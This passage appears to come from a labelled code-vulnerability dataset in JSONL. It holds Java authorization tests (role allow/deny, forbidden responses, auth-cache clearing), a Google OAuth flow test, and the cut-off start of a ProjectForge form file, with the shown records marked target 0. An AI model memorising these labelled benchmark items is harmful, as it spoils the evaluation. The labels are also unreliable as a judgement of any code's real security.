this.host.failIteration(e);\n                        return;\n                    }\n\n                    factoryGetResult[0] = o.getBody(ServiceDocumentQueryResult.class);\n                    this.host.completeIteration();\n                });\n\n        this.host.testStart(1);\n        this.host.send(getFactory);\n        this.host.testWait();\n\n        // DELETE operation should be denied\n        Set<String> selfLinks = new HashSet<>(factoryGetResult[0].documentLinks);\n        for (String selfLink : selfLinks) {\n            Operation deleteOperation =\n                    Operation.createDelete(UriUtils.buildUri(this.host, selfLink))\n                            .setCompletion((o, e) -> {\n                                if (o.getStatusCode() != Operation.STATUS_CODE_FORBIDDEN) {\n                                    String message = String.format(\"Expected %d, got %s\",\n                                            Operation.STATUS_CODE_FORBIDDEN,\n                                            o.getStatusCode());\n                                    this.host.failIteration(new IllegalStateException(message));\n                                    return;\n                                }\n\n                                this.host.completeIteration();\n                            });\n            this.host.testStart(1);\n            this.host.send(deleteOperation);\n            this.host.testWait();\n        }\n\n        // PATCH operation should be allowed\n        for (String selfLink : selfLinks) {\n            Operation patchOperation =\n                    Operation.createPatch(UriUtils.buildUri(this.host, selfLink))\n                        .setBody(exampleServices.get(selfLink))\n                        .setCompletion((o, e) -> {\n                            if (o.getStatusCode() != Operation.STATUS_CODE_OK) {\n                                String message = String.format(\"Expected %d, got %s\",\n                                        Operation.STATUS_CODE_OK,\n                                        o.getStatusCode());\n                                this.host.failIteration(new IllegalStateException(message));\n                                return;\n                            }\n\n                            this.host.completeIteration();\n                        });\n            this.host.testStart(1);\n            this.host.send(patchOperation);\n            this.host.testWait();\n        }\n    }\n\n    @Test\n    public void testAllowAndDenyRoles() throws Exception {\n        // 1) Create example services state as the system user\n        OperationContext.setAuthorizationContext(this.host.getSystemAuthorizationContext());\n        ExampleServiceState state = createExampleServiceState(\"testExampleOK\", 1L);\n\n        Operation response = this.host.waitForResponse(\n                Operation.createPost(UriUtils.buildUri(this.host, ExampleService.FACTORY_LINK))\n                        .setBody(state));\n        assertEquals(Operation.STATUS_CODE_OK, response.getStatusCode());\n        state = response.getBody(ExampleServiceState.class);\n\n        // 2) verify Jane cannot POST or GET\n        assertAccess(Policy.DENY);\n\n        // 3) build ALLOW role and verify access\n        buildRole(\"AllowRole\", Policy.ALLOW);\n        assertAccess(Policy.ALLOW);\n\n        // 4) build DENY role and verify access\n        buildRole(\"DenyRole\", Policy.DENY);\n        assertAccess(Policy.DENY);\n\n        // 5) build another ALLOW role and verify access\n        buildRole(\"AnotherAllowRole\", Policy.ALLOW);\n        assertAccess(Policy.DENY);\n\n        // 6) delete deny role and verify access\n        OperationContext.setAuthorizationContext(this.host.getSystemAuthorizationContext());\n        response = this.host.waitForResponse(Operation.createDelete(\n                UriUtils.buildUri(this.host,\n                        UriUtils.buildUriPath(RoleService.FACTORY_LINK, \"DenyRole\"))));\n        assertEquals(Operation.STATUS_CODE_OK, response.getStatusCode());\n        assertAccess(Policy.ALLOW);\n    }\n\n    private void buildRole(String roleName, Policy policy) {\n        OperationContext.setAuthorizationContext(this.host.getSystemAuthorizationContext());\n        TestContext ctx = this.host.testCreate(1);\n        AuthorizationSetupHelper.create().setHost(this.host)\n                .setRoleName(roleName)\n                .setUserGroupQuery(Query.Builder.create()\n                        .addCollectionItemClause(UserState.FIELD_NAME_EMAIL, \"jane@doe.com\")\n                        .build())\n                .setResourceQuery(Query.Builder.create()\n                        .addFieldClause(ServiceDocument.FIELD_NAME_SELF_LINK,\n                                ExampleService.FACTORY_LINK,\n                                MatchType.PREFIX)\n                        .build())\n                .setVerbs(EnumSet.of(Action.POST, Action.PUT, Action.PATCH, Action.GET,\n                        Action.DELETE))\n                .setPolicy(policy)\n                .setCompletion((authEx) -> {\n                    if (authEx != null) {\n                        ctx.failIteration(authEx);\n                        return;\n                    }\n                    ctx.completeIteration();\n                }).setupRole();\n        this.host.testWait(ctx);\n    }\n\n    private void assertAccess(Policy policy) throws Exception {\n        this.host.assumeIdentity(this.userServicePath);\n        Operation response = this.host.waitForResponse(\n                Operation.createPost(UriUtils.buildUri(this.host, ExampleService.FACTORY_LINK))\n                        .setBody(createExampleServiceState(\"testExampleDeny\", 2L)));\n        if (policy == Policy.DENY) {\n            assertEquals(Operation.STATUS_CODE_FORBIDDEN, response.getStatusCode());\n        } else {\n            assertEquals(Operation.STATUS_CODE_OK, response.getStatusCode());\n        }\n\n        response = this.host.waitForResponse(\n                Operation.createGet(UriUtils.buildUri(this.host, ExampleService.FACTORY_LINK)));\n        assertEquals(Operation.STATUS_CODE_OK, response.getStatusCode());\n        ServiceDocumentQueryResult result = response.getBody(ServiceDocumentQueryResult.class);\n        if (policy == Policy.DENY) {\n            assertEquals(Long.valueOf(0L), result.documentCount);\n        } else {\n            assertNotNull(result.documentCount);\n            assertNotEquals(Long.valueOf(0L), result.documentCount);\n        }\n    }\n\n    @Test\n    public void statefulServiceAuthorization() throws Throwable {\n        // Create example services not accessible by jane (as the system user)\n        OperationContext.setAuthorizationContext(this.host.getSystemAuthorizationContext());\n        Map<URI, ExampleServiceState> exampleServices = createExampleServices(\"john\");\n\n        // try to create services with no user context set; we should get a 403\n        OperationContext.setAuthorizationContext(null);\n        ExampleServiceState state = createExampleServiceState(\"jane\", new Long(\"100\"));\n        TestContext ctx1 = this.host.testCreate(1);\n        this.host.send(\n                Operation.createPost(UriUtils.buildUri(this.host, ExampleService.FACTORY_LINK))\n                        .setBody(state)\n                        .setCompletion((o, e) -> {\n                            if (o.getStatusCode() != Operation.STATUS_CODE_FORBIDDEN) {\n                                String message = String.format(\"Expected %d, got %s\",\n                                        Operation.STATUS_CODE_FORBIDDEN,\n                                        o.getStatusCode());\n                                ctx1.failIteration(new IllegalStateException(message));\n                                return;\n                            }\n\n                            ctx1.completeIteration();\n                        }));\n        this.host.testWait(ctx1);\n\n        // issue a GET on a factory with no auth context, no documents should be returned\n        TestContext ctx2 = this.host.testCreate(1);\n        this.host.send(\n                Operation.createGet(UriUtils.buildUri(this.host, ExampleService.FACTORY_LINK))\n                .setCompletion((o, e) -> {\n                    if (e != null) {\n                        ctx2.failIteration(new IllegalStateException(e));\n                        return;\n                    }\n                    ServiceDocumentQueryResult res = o\n                            .getBody(ServiceDocumentQueryResult.class);\n                    if (!res.documentLinks.isEmpty()) {\n                        String message = String.format(\"Expected 0 results; Got %d\",\n                                res.documentLinks.size());\n                        ctx2.failIteration(new IllegalStateException(message));\n                        return;\n                    }\n\n                    ctx2.completeIteration();\n                }));\n        this.host.testWait(ctx2);\n\n        // do GET on factory /stats, we should get 403\n        Operation statsGet = Operation.createGet(this.host,\n                ExampleService.FACTORY_LINK + ServiceHost.SERVICE_URI_SUFFIX_STATS);\n        this.host.sendAndWaitExpectFailure(statsGet, Operation.STATUS_CODE_FORBIDDEN);\n\n        // do GET on factory /config, we should get 403\n        Operation configGet = Operation.createGet(this.host,\n                ExampleService.FACTORY_LINK + ServiceHost.SERVICE_URI_SUFFIX_CONFIG);\n        this.host.sendAndWaitExpectFailure(configGet, Operation.STATUS_CODE_FORBIDDEN);\n\n        // Assume Jane's identity\n        this.host.assumeIdentity(this.userServicePath);\n        // add docs accessible by jane\n        exampleServices.putAll(createExampleServices(\"jane\"));\n\n        verifyJaneAccess(exampleServices, null);\n\n        // Execute get on factory trying to get all example services\n        TestContext ctx3 = this.host.testCreate(1);\n        final ServiceDocumentQueryResult[] factoryGetResult = new ServiceDocumentQueryResult[1];\n        Operation getFactory = Operation.createGet(\n                UriUtils.buildUri(this.host, ExampleService.FACTORY_LINK))\n                .setCompletion((o, e) -> {\n                    if (e != null) {\n                        ctx3.failIteration(e);\n                        return;\n                    }\n\n                    factoryGetResult[0] = o.getBody(ServiceDocumentQueryResult.class);\n                    ctx3.completeIteration();\n                });\n        this.host.send(getFactory);\n        this.host.testWait(ctx3);\n\n        // Make sure only the authorized services were returned\n        assertAuthorizedServicesInResult(\"jane\", exampleServices, factoryGetResult[0]);\n\n        // Execute query task trying to get all example services\n        QueryTask.QuerySpecification q = new QueryTask.QuerySpecification();\n        q.query.setTermPropertyName(ServiceDocument.FIELD_NAME_KIND)\n                .setTermMatchValue(Utils.buildKind(ExampleServiceState.class));\n        URI u = this.host.createQueryTaskService(QueryTask.create(q));\n        QueryTask task = this.host.waitForQueryTaskCompletion(q, 1, 1, u, false, true, false);\n        assertEquals(TaskState.TaskStage.FINISHED, task.taskInfo.stage);\n\n        // Make sure only the authorized services were returned\n        assertAuthorizedServicesInResult(\"jane\", exampleServices, task.results);\n\n        // reset the auth context\n        OperationContext.setAuthorizationContext(null);\n\n        // do GET on utility suffixes in example child services, we should get 403\n        for (URI childUri : exampleServices.keySet()) {\n            statsGet = Operation.createGet(this.host,\n                    childUri.getPath() + ServiceHost.SERVICE_URI_SUFFIX_STATS);\n            this.host.sendAndWaitExpectFailure(statsGet, Operation.STATUS_CODE_FORBIDDEN);\n            configGet = Operation.createGet(this.host,\n                    childUri.getPath() + ServiceHost.SERVICE_URI_SUFFIX_CONFIG);\n            this.host.sendAndWaitExpectFailure(configGet, Operation.STATUS_CODE_FORBIDDEN);\n        }\n\n        // Assume Jane's identity through header auth token\n        String authToken = generateAuthToken(this.userServicePath);\n\n        // do GET on utility suffixes in example child services, we should get 200\n        for (URI childUri : exampleServices.keySet()) {\n            statsGet = Operation.createGet(this.host,\n                    childUri.getPath() + ServiceHost.SERVICE_URI_SUFFIX_STATS);\n            statsGet.addRequestHeader(Operation.REQUEST_AUTH_TOKEN_HEADER, authToken);\n            this.host.sendAndWaitExpectSuccess(statsGet);\n        }\n\n        verifyJaneAccess(exampleServices, authToken);\n\n        // test user impersonation\n        this.host.setSystemAuthorizationContext();\n        AuthzStatefulService s = new AuthzStatefulService();\n        this.host.addPrivilegedService(AuthzStatefulService.class);\n\n        AuthzState body = new AuthzState();\n        body.userLink = this.userServicePath;\n        this.host.startServiceAndWait(s, UUID.randomUUID().toString(), body);\n        this.host.resetSystemAuthorizationContext();\n    }\n\n    private AuthorizationContext assumeIdentityAndGetContext(String userLink,\n            Service privilegedService, boolean populateCache) throws Throwable {\n        AuthorizationContext authContext = this.host.assumeIdentity(userLink);\n        if (populateCache) {\n            this.host.sendAndWaitExpectSuccess(\n                    Operation.createGet(UriUtils.buildUri(this.host, ExampleService.FACTORY_LINK)));\n        }\n        return this.host.getAuthorizationContext(privilegedService, authContext.getToken());\n    }\n\n    @Test\n    public void authCacheClearToken() throws Throwable {\n        this.host.setSystemAuthorizationContext();\n        AuthorizationHelper authHelperForFoo = new AuthorizationHelper(this.host);\n        String email = \"foo@foo.com\";\n        String fooUserLink = authHelperForFoo.createUserService(this.host, email);\n        // spin up a privileged service to query for auth context\n        MinimalTestService s = new MinimalTestService();\n        this.host.addPrivilegedService(MinimalTestService.class);\n        this.host.startServiceAndWait(s, UUID.randomUUID().toString(), null);\n        this.host.resetSystemAuthorizationContext();\n\n        AuthorizationContext authContext1 = assumeIdentityAndGetContext(fooUserLink, s, true);\n        AuthorizationContext authContext2 = assumeIdentityAndGetContext(fooUserLink, s, true);\n        assertNotNull(authContext1);\n        assertNotNull(authContext2);\n\n        this.host.setSystemAuthorizationContext();\n        Operation clearAuthOp = new Operation();\n        clearAuthOp.setUri(UriUtils.buildUri(this.host, fooUserLink));\n        TestContext ctx = this.host.testCreate(1);\n        clearAuthOp.setCompletion(ctx.getCompletion());\n        AuthorizationCacheUtils.clearAuthzCacheForUser(s, clearAuthOp);\n        clearAuthOp.complete();\n        this.host.testWait(ctx);\n        this.host.resetSystemAuthorizationContext();\n\n        assertNull(this.host.getAuthorizationContext(s, authContext1.getToken()));\n        assertNull(this.host.getAuthorizationContext(s, authContext2.getToken()));\n    }\n\n    @Test\n    public void transactionWithAuth() throws Throwable {\n        // assume system identity so we can create roles\n        this.host.setSystemAuthorizationContext();\n        String resourceGroupLink = this.authHelper.createResourceGroup(this.host,\n                \"transaction-group\", Builder.create()\n                        .addFieldClause(\n                                ServiceDocument.FIELD_NAME_KIND,\n                                Utils.buildKind(TransactionServiceState.class))\n                        .build());\n        this.authHelper.createRole(this.host, this.authHelper.getUserGroupLink(),\n                resourceGroupLink, EnumSet.allOf(Action.class));\n        this.host.resetAuthorizationContext();\n        // assume identity as Jane and test to see if example service documents can be created\n        this.host.assumeIdentity(this.userServicePath);\n        String txid = TestTransactionUtils.newTransaction(this.host);\n        OperationContext.setTransactionId(txid);\n        createExampleServices(\"jane\");\n        boolean committed = TestTransactionUtils.commit(this.host, txid);\n        assertTrue(committed);\n        OperationContext.setTransactionId(null);\n        ServiceDocumentQueryResult res = host.getFactoryState(UriUtils.buildUri(this.host, ExampleService.FACTORY_LINK));\n        assertEquals(Long.valueOf(this.serviceCount), res.documentCount);\n        // next create docs and abort; these documents must  not be present\n        txid = TestTransactionUtils.newTransaction(this.host);\n        OperationContext.setTransactionId(txid);\n        createExampleServices(\"jane\");\n        res = host.getFactoryState(UriUtils.buildUri(this.host, ExampleService.FACTORY_LINK));\n        assertEquals(Long.valueOf(2 * this.serviceCount), res.documentCount);\n        boolean aborted = TestTransactionUtils.abort(this.host, txid);\n        assertTrue(aborted);\n        OperationContext.setTransactionId(null);\n        res = host.getFactoryState(UriUtils.buildUri(this.host, ExampleService.FACTORY_LINK));\n        assertEquals(Long.valueOf( this.serviceCount), res.documentCount);\n    }\n\n    @Test\n    public void updateAuthzCache() throws Throwable {\n        ExecutorService executor = null;\n        try {\n            this.host.setSystemAuthorizationContext();\n            AuthorizationHelper authsetupHelper = new AuthorizationHelper(this.host);\n            String email = \"foo@foo.com\";\n            String userLink = authsetupHelper.createUserService(this.host, email);\n            Query userGroupQuery = Query.Builder.create().addFieldClause(UserState.FIELD_NAME_EMAIL, email).build();\n            String userGroupLink = authsetupHelper.createUserGroup(this.host, email, userGroupQuery);\n            UserState patchState = new UserState();\n            patchState.userGroupLinks = Collections.singleton(userGroupLink);\n            this.host.sendAndWaitExpectSuccess(\n                    Operation.createPatch(UriUtils.buildUri(this.host, userLink))\n                    .setBody(patchState));\n            TestContext ctx = this.host.testCreate(this.serviceCount);\n            Service s = this.host.startServiceAndWait(MinimalTestService.class, UUID.randomUUID()\n                    .toString());\n            executor = this.host.allocateExecutor(s);\n            this.host.resetSystemAuthorizationContext();\n            for (int i = 0; i < this.serviceCount; i++) {\n                this.host.run(executor, () -> {\n                    String serviceName = UUID.randomUUID().toString();\n                    try {\n                        this.host.setSystemAuthorizationContext();\n                        Query resourceQuery = Query.Builder.create().addFieldClause(ExampleServiceState.FIELD_NAME_NAME,\n                                serviceName).build();\n                        String resourceGroupLink = authsetupHelper.createResourceGroup(this.host, serviceName, resourceQuery);\n                        authsetupHelper.createRole(this.host, userGroupLink, resourceGroupLink, EnumSet.allOf(Action.class));\n                        this.host.resetSystemAuthorizationContext();\n                        this.host.assumeIdentity(userLink);\n                        ExampleServiceState exampleState = new ExampleServiceState();\n                        exampleState.name = serviceName;\n                        exampleState.documentSelfLink = serviceName;\n                        // Issue: https://www.pivotaltracker.com/story/show/131520613\n                        // We have a potential race condition in the code where the role\n                        // created above is not being reflected in the auth context for\n                        // the user; We are retrying the operation to mitigate the issue\n                        // till we have a fix for the issue\n                        for (int retryCounter = 0; retryCounter < 3; retryCounter++) {\n                            try {\n                                this.host.sendAndWaitExpectSuccess(\n                                        Operation.createPost(UriUtils.buildUri(this.host, ExampleService.FACTORY_LINK))\n                                        .setBody(exampleState));\n                                break;\n                            } catch (Throwable t) {\n                                this.host.log(Level.WARNING, \"Error creating example service: \" + t.getMessage());\n                                if (retryCounter == 2) {\n                                    ctx.fail(new IllegalStateException(\"Example service creation failed thrice\"));\n                                    return;\n                                }\n                            }\n                        }\n                        this.host.sendAndWaitExpectSuccess(\n                                Operation.createDelete(UriUtils.buildUri(this.host,\n                                        UriUtils.buildUriPath(ExampleService.FACTORY_LINK, serviceName))));\n                        ctx.complete();\n                    } catch (Throwable e) {\n                        this.host.log(Level.WARNING, e.getMessage());\n                        ctx.fail(e);\n                    }\n                });\n            }\n            this.host.testWait(ctx);\n        } finally {\n            if (executor != null) {\n                executor.shutdown();\n            }\n        }\n    }\n\n    @Test\n    public void testAuthzUtils() throws Throwable {\n        this.host.setSystemAuthorizationContext();\n        AuthorizationHelper authHelperForFoo = new AuthorizationHelper(this.host);\n        String email = \"foo@foo.com\";\n        String fooUserLink = authHelperForFoo.createUserService(this.host, email);\n        UserState patchState = new UserState();\n        patchState.userGroupLinks = new HashSet<String>();\n        patchState.userGroupLinks.add(UriUtils.buildUriPath(\n                UserGroupService.FACTORY_LINK, authHelperForFoo.getUserGroupName(email)));\n        authHelperForFoo.patchUserService(this.host, fooUserLink, patchState);\n        // create a user group based on a query for userGroupLink\n        authHelperForFoo.createRoles(this.host, email);\n        // spin up a privileged service to query for auth context\n        MinimalTestService s = new MinimalTestService();\n        this.host.addPrivilegedService(MinimalTestService.class);\n        this.host.startServiceAndWait(s, UUID.randomUUID().toString(), null);\n        this.host.resetSystemAuthorizationContext();\n\n        String userGroupLink = authHelperForFoo.getUserGroupLink();\n        String resourceGroupLink = authHelperForFoo.getResourceGroupLink();\n        String roleLink = authHelperForFoo.getRoleLink();\n\n\n        // get the user group service and clear the authz cache\n        assertNotNull(assumeIdentityAndGetContext(fooUserLink, s, true));\n        this.host.setSystemAuthorizationContext();\n        Operation getUserGroupStateOp =\n                Operation.createGet(UriUtils.buildUri(this.host, userGroupLink));\n        Operation resultOp = this.host.waitForResponse(getUserGroupStateOp);\n        UserGroupState userGroupState = resultOp.getBody(UserGroupState.class);\n        Operation clearAuthOp = new Operation();\n        TestContext ctx = this.host.testCreate(1);\n        clearAuthOp.setCompletion(ctx.getCompletion());\n        AuthorizationCacheUtils.clearAuthzCacheForUserGroup(s, clearAuthOp, userGroupState);\n        clearAuthOp.complete();\n        this.host.testWait(ctx);\n        this.host.resetSystemAuthorizationContext();\n        assertNull(assumeIdentityAndGetContext(fooUserLink, s, false));\n\n        // get the resource group and clear the authz cache\n        assertNotNull(assumeIdentityAndGetContext(fooUserLink, s, true));\n        this.host.setSystemAuthorizationContext();\n        clearAuthOp = new Operation();\n        ctx = this.host.testCreate(1);\n        clearAuthOp.setCompletion(ctx.getCompletion());\n        clearAuthOp.setUri(UriUtils.buildUri(this.host, resourceGroupLink));\n        AuthorizationCacheUtils.clearAuthzCacheForResourceGroup(s, clearAuthOp);\n        clearAuthOp.complete();\n        this.host.testWait(ctx);\n        this.host.resetSystemAuthorizationContext();\n        assertNull(assumeIdentityAndGetContext(fooUserLink, s, false));\n\n        // get the role service and clear the authz cache\n        assertNotNull(assumeIdentityAndGetContext(fooUserLink, s, true));\n        this.host.setSystemAuthorizationContext();\n        Operation getRoleStateOp =\n                Operation.createGet(UriUtils.buildUri(this.host, roleLink));\n        resultOp = this.host.waitForResponse(getRoleStateOp);\n        RoleState roleState = resultOp.getBody(RoleState.class);\n        clearAuthOp = new Operation();\n        ctx = this.host.testCreate(1);\n        clearAuthOp.setCompletion(ctx.getCompletion());\n        AuthorizationCacheUtils.clearAuthzCacheForRole(s, clearAuthOp, roleState);\n        clearAuthOp.complete();\n        this.host.testWait(ctx);\n        this.host.resetSystemAuthorizationContext();\n        assertNull(assumeIdentityAndGetContext(fooUserLink, s, false));\n\n        // finally, get the user service and clear the authz cache\n        assertNotNull(assumeIdentityAndGetContext(fooUserLink, s, true));\n        this.host.setSystemAuthorizationContext();\n        clearAuthOp = new Operation();\n        clearAuthOp.setUri(UriUtils.buildUri(this.host, fooUserLink));\n        ctx = this.host.testCreate(1);\n        clearAuthOp.setCompletion(ctx.getCompletion());\n        AuthorizationCacheUtils.clearAuthzCacheForUser(s, clearAuthOp);\n        clearAuthOp.complete();\n        this.host.testWait(ctx);\n        this.host.resetSystemAuthorizationContext();\n        assertNull(assumeIdentityAndGetContext(fooUserLink, s, false));\n    }\n\n    private void verifyJaneAccess(Map<URI, ExampleServiceState> exampleServices, String authToken) throws Throwable {\n        // Try to GET all example services\n        this.host.testStart(exampleServices.size());\n        for (Entry<URI, ExampleServiceState> entry : exampleServices.entrySet()) {\n            Operation get = Operation.createGet(entry.getKey());\n            // force to create a remote context\n            if (authToken != null) {\n                get.forceRemote();\n                get.getRequestHeaders().put(Operation.REQUEST_AUTH_TOKEN_HEADER, authToken);\n            }\n            if (entry.getValue().name.equals(\"jane\")) {\n                // Expect 200 OK\n                get.setCompletion((o, e) -> {\n                    if (o.getStatusCode() != Operation.STATUS_CODE_OK) {\n                        String message = String.format(\"Expected %d, got %s\",\n                                Operation.STATUS_CODE_OK,\n                                o.getStatusCode());\n                        this.host.failIteration(new IllegalStateException(message));\n                        return;\n                    }\n                    ExampleServiceState body = o.getBody(ExampleServiceState.class);\n                    if (!body.documentAuthPrincipalLink.equals(this.userServicePath)) {\n                        String message = String.format(\"Expected %s, got %s\",\n                                this.userServicePath, body.documentAuthPrincipalLink);\n                        this.host.failIteration(new IllegalStateException(message));\n                        return;\n                    }\n                    this.host.completeIteration();\n                });\n            } else {\n                // Expect 403 Forbidden\n                get.setCompletion((o, e) -> {\n                    if (o.getStatusCode() != Operation.STATUS_CODE_FORBIDDEN) {\n                        String message = String.format(\"Expected %d, got %s\",\n                                Operation.STATUS_CODE_FORBIDDEN,\n                                o.getStatusCode());\n                        this.host.failIteration(new IllegalStateException(message));\n                        return;\n                    }\n\n                    this.host.completeIteration();\n                });\n            }\n\n            this.host.send(get);\n        }\n        this.host.testWait();\n    }\n\n    private void assertAuthorizedServicesInResult(String name,\n            Map<URI, ExampleServiceState> exampleServices,\n            ServiceDocumentQueryResult result) {\n        Set<String> selfLinks = new HashSet<>(result.documentLinks);\n        for (Entry<URI, ExampleServiceState> entry : exampleServices.entrySet()) {\n            String selfLink = entry.getKey().getPath();\n            if (entry.getValue().name.equals(name)) {\n                assertTrue(selfLinks.contains(selfLink));\n            } else {\n                assertFalse(selfLinks.contains(selfLink));\n            }\n        }\n    }\n\n    private String generateAuthToken(String userServicePath) throws GeneralSecurityException {\n        Claims.Builder builder = new Claims.Builder();\n        builder.setSubject(userServicePath);\n        Claims claims = builder.getResult();\n        return this.host.getTokenSigner().sign(claims);\n    }\n\n    private ExampleServiceState createExampleServiceState(String name, Long counter) {\n        ExampleServiceState state = new ExampleServiceState();\n        state.name = name;\n        state.counter = counter;\n        state.documentAuthPrincipalLink = \"stringtooverwrite\";\n        return state;\n    }\n\n    private Map<URI, ExampleServiceState> createExampleServices(String userName) throws Throwable {\n        Collection<ExampleServiceState> bodies = new LinkedList<>();\n        for (int i = 0; i < this.serviceCount; i++) {\n            bodies.add(createExampleServiceState(userName, 1L));\n        }\n\n        Iterator<ExampleServiceState> it = bodies.iterator();\n        Consumer<Operation> bodySetter = (o) -> {\n            o.setBody(it.next());\n        };\n\n        Map<URI, ExampleServiceState> states = this.host.doFactoryChildServiceStart(\n                null,\n                bodies.size(),\n                ExampleServiceState.class,\n                bodySetter,\n                UriUtils.buildFactoryUri(this.host, ExampleService.class));\n\n        return states;\n    }\n}\n", "target": 0}
{"idx": 1029, "func": "/*\n * Copyright (c) 2013 Google Inc.\n *\n * Licensed under the Apache License, Version 2.0 (the \"License\"); you may not use this file except\n * in compliance with the License. You may obtain a copy of the License at\n *\n * http://www.apache.org/licenses/LICENSE-2.0\n *\n * Unless required by applicable law or agreed to in writing, software distributed under the License\n * is distributed on an \"AS IS\" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express\n * or implied. See the License for the specific language governing permissions and limitations under\n * the License.\n */\n\npackage com.google.api.client.auth.oauth2;\n\nimport com.google.api.client.auth.oauth2.AuthorizationCodeFlow.CredentialCreatedListener;\nimport com.google.api.client.http.BasicAuthentication;\nimport com.google.api.client.json.jackson2.JacksonFactory;\nimport com.google.api.client.util.Joiner;\n\nimport java.io.IOException;\nimport java.util.Arrays;\nimport java.util.Collection;\nimport java.util.Collections;\nimport java.util.HashSet;\nimport java.util.Set;\n\n/**\n * Tests {@link AuthorizationCodeFlow}.\n *\n * @author Yaniv Inbar\n */\npublic class AuthorizationCodeFlowTest extends AuthenticationTestBase {\n\n  static class MyCredentialCreatedListener implements CredentialCreatedListener {\n\n    boolean called = false;\n\n    public void onCredentialCreated(Credential credential, TokenResponse tokenResponse)\n        throws IOException {\n      called = true;\n    }\n  }\n\n  static class MyCredentialRefreshListener implements CredentialRefreshListener {\n\n    boolean calledOnResponse = false;\n    boolean calledOnError = false;\n\n    public void onTokenResponse(Credential credential, TokenResponse tokenResponse)\n        throws IOException {\n      calledOnResponse = true;\n    }\n\n    public void onTokenErrorResponse(Credential credential, TokenErrorResponse tokenErrorResponse)\n        throws IOException {\n      calledOnError = true;\n    }\n  }\n\n  public void testCredentialCreatedListener() throws IOException {\n    MyCredentialCreatedListener listener = new MyCredentialCreatedListener();\n    AuthorizationCodeFlow flow =\n        new AuthorizationCodeFlow.Builder(BearerToken.queryParameterAccessMethod(),\n            new AccessTokenTransport(),\n            new JacksonFactory(),\n            TOKEN_SERVER_URL,\n            new BasicAuthentication(CLIENT_ID, CLIENT_SECRET),\n            CLIENT_ID,\n            \"authorizationServerEncodedUrl\").setCredentialCreatedListener(listener).build();\n    assertFalse(listener.called);\n    flow.createAndStoreCredential(new TokenResponse(), \"userId\");\n    assertTrue(listener.called);\n  }\n\n  public void testRefreshListeners() throws IOException {\n    MyCredentialRefreshListener listener1 = new MyCredentialRefreshListener();\n    MyCredentialRefreshListener listener2 = new MyCredentialRefreshListener();\n\n    AuthorizationCodeFlow flow = new AuthorizationCodeFlow.Builder(BearerToken\n        .queryParameterAccessMethod(),\n        new AccessTokenTransport(),\n        new JacksonFactory(),\n        TOKEN_SERVER_URL,\n        new BasicAuthentication(CLIENT_ID, CLIENT_SECRET),\n        CLIENT_ID,\n        \"authorizationServerEncodedUrl\").addRefreshListener(listener1)\n        .addRefreshListener(listener2).build();\n    TokenResponse tokenResponse = new TokenResponse();\n    tokenResponse.setAccessToken(ACCESS_TOKEN);\n    tokenResponse.setRefreshToken(REFRESH_TOKEN);\n    Credential cred = flow.createAndStoreCredential(tokenResponse, \"userId\");\n    assertFalse(listener1.calledOnResponse);\n    assertFalse(listener2.calledOnResponse);\n    assertFalse(listener1.calledOnError);\n    assertFalse(listener2.calledOnError);\n    assertTrue(cred.refreshToken());\n    assertTrue(listener1.calledOnResponse);\n    assertTrue(listener2.calledOnResponse);\n    assertFalse(listener1.calledOnError);\n    assertFalse(listener2.calledOnError);\n  }\n\n  public void testNewAuthorizationUrl() {\n    subsetTestNewAuthorizationUrl(Collections.<String>emptyList());\n    subsetTestNewAuthorizationUrl(Collections.singleton(\"a\"));\n    subsetTestNewAuthorizationUrl(Arrays.asList(\"a\", \"b\", \"c\", \"d\"));\n  }\n\n  public void subsetTestNewAuthorizationUrl(Collection<String> scopes) {\n    AuthorizationCodeFlow flow =\n        new AuthorizationCodeFlow.Builder(BearerToken.queryParameterAccessMethod(),\n            new AccessTokenTransport(),\n            new JacksonFactory(),\n            TOKEN_SERVER_URL,\n            new BasicAuthentication(CLIENT_ID, CLIENT_SECRET),\n            CLIENT_ID,\n            \"https://example.com\").setScopes(scopes).build();\n\n    AuthorizationCodeRequestUrl url = flow.newAuthorizationUrl();\n    if (scopes.isEmpty()) {\n      assertNull(url.getScopes());\n    } else {\n      assertEquals(Joiner.on(' ').join(scopes), url.getScopes());\n    }\n  }\n\n  public void testPKCE() {\n    AuthorizationCodeFlow flow =\n        new AuthorizationCodeFlow.Builder(BearerToken.queryParameterAccessMethod(),\n            new AccessTokenTransport(),\n            new JacksonFactory(),\n            TOKEN_SERVER_URL,\n            new BasicAuthentication(CLIENT_ID, CLIENT_SECRET),\n            CLIENT_ID,\n            \"https://example.com\")\n        .enablePKCE()\n        .build();\n\n    AuthorizationCodeRequestUrl url = flow.newAuthorizationUrl();\n    assertNotNull(url.getCodeChallenge());\n    assertNotNull(url.getCodeChallengeMethod());\n    Set<String> methods = new HashSet<>(Arrays.asList(\"plain\", \"s256\"));\n    assertTrue(methods.contains(url.getCodeChallengeMethod().toLowerCase()));\n    assertTrue(url.getCodeChallenge().length() > 0);\n  }\n}\n", "target": 0}
{"idx": 1030, "func": "/////////////////////////////////////////////////////////////////////////////\n//\n// Project ProjectForge Community Edition\n//         www.projectforge.org\n//\n// Copyright (C) 2001-2013 Kai Reinhard (k.reinhard@micromata.de)\n//\n// ProjectForge is dual-licensed.\n//\n// This community edition is free software; you can redistribute it and/or\n// modify it under the terms of the GNU General Public License as published\n// by the Free Software Foundation; version 3 of the License.\n//\n// This community edition is distributed in the hope that it will be useful,\n// but WITHOUT ANY WARRANTY; without even the implied warranty of\n// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the GNU General\n// Public License for more details.\n//\n// You should have received a copy of the GNU General Public License along\n// with this program; if not, see http://www.gnu.org/licenses/.\n//\n/////////////////////////////////////////////////////////////////////////////\n\npackage org.projectforge.web.admin;\n\nimport java.util.TimeZone;\n\nimport org.apache.commons.lang.StringUtils;\nimport org.apache.wicket.markup.ComponentTag;\nimport org.apache.wicket.markup.html.form.Button;\nimport org.apache.wicket.markup.html.form.PasswordTextField;\nimport org.apache.wicket.markup.repeater.RepeatingView;\nimport org.apache.wicket.model.Model;\nimport org.apache.wicket.model.PropertyModel;\nimport org.apache.wicket.spring.injection.annot.SpringBean;\nimport org.apache.wicket.validation.IValidatable;\nimport org.apache.wicket.validation.IValidator;\nimport org.projectforge.core.Configuration;\nimport org.projectforge.core.ConfigurationDO;\nimport org.projectforge.database.InitDatabaseDao;\nimport org.projectforge.user.UserDao;\nimport org.projectforge.web.wicket.AbstractForm;\nimport org.projectforge.web.wicket.WicketUtils;\nimport org.projectforge.web.wicket.bootstrap.GridBuilder;\nimport org.projectforge.web.wicket.components.MaxLengthTextField;\nimport 